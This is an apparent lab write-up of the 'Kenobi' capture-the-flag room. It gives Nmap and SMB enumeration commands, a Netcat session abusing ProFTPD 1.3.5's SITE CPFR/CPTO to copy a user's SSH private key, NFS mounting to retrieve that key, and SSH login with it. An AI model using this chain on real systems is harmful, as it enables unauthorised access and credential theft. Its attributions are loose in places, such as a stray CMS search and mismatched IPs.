## General Information
- Room: Kenobi
- Difficulty: Easy
- Date: 10/11/2023
- Description: "Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation." 


## Methodology
- Reconnaissance:
    - Conducted Nmap port scans for open ports and service details.
    - Utilized Nmap scripts for SMB and NFS enumeration.
- Tools and Exploitation:
    - Executed targeted Nmap scans for service versions.
    - Used smbclient and smbget for SMB enumeration.
    - Searched for CMS Made Simple 2.2 vulnerabilities with searchsploit.
    - Manipulated ProFTPD 1.3.5 via Netcat for FTP exploitation.
    - Explored NFS shares and mounted them.
    - Established SSH access using obtained credentials.
    - Identified setuid files for potential privilege escalation.


## Results

### Reconnaissance
- IP: 10.10.105.176-        
- Port Scan results:

| PORT   | STATE | SERVICE    | VERSION                                |
|--------|-------|------------|----------------------------------------|
| 21/tcp | open  | ftp        | ProFTPD 1.3.5                          |
| 22/tcp | open  | ssh        | OpenSSH 7.2p2 Ubuntu 4ubuntu2.7        |
| 80/tcp | open  | http       | Apache httpd 2.4.18 (Ubuntu)            |
| 111/tcp| open  | rpcbind    | 2-4 (RPC #100000)                      |
| 139/tcp| open  | netbios-ssn| Samba smbd 3.X - 4.X (workgroup: WORKGROUP) |
| 445/tcp| open  | netbios-ssn| Samba smbd 3.X - 4.X (workgroup: WORKGROUP) |
| 2049/tcp| open | nfs        | 2-4 (RPC #100003)                      |

Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


### Tools and Exploitation

#### nmap scan
~~~nmap
nmap -sV -oN nmap_scan.txt 10.10.105.176
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse -oN nmap_enum_shares.txt 10.10.105.176
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.228.131
~~~

#### SMB
~~~smbclient; smbget
smbclient //10.10.105.176/anonymous
smbget -R smb://10.10.105.176/anonymous
~~~

#### searchsploit
~~~searchsploit
└─$ searchsploit cms made simple 2.2 
~~~

#### Netcat
~~~ nc
$ nc 10.10.105.176 21                                                                    
SITE CPFR /home/kenobi/.ssh/id_rsa 
SITE CPTO /var/tmp/id_rsa 
~~~

#### mount
~~~ mount
sudo mkdir /mnt/kenobiNFS
sudo mount 10.10.228.131:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa ./ 
sudo chmod 600 id_rsa  
~~~

#### SSH
~~~ssh
ssh -i id_rsa kenobi@10.10.105.176
~~~

#### find
~~~find
 find / -perm -u=s -type f 2>/dev/null 
~~~


### Exploited Vulnerabilities
- ProFTPD 1.3.5 Vulnerability:
    - Unauthorized FTP access and sensitive file retrieval due to ProFTPD 1.3.5 vulnerability exploitation.
- Samba Vulnerabilities:
    - Identified open SMB ports (139/tcp and 445/tcp) using Nmap.
    - Exploited Samba vulnerabilities for enumeration and access to anonymous shares.
- NFS Privilege Escalation:
    - Gained potential information exposure and privileges through NFS share mounting.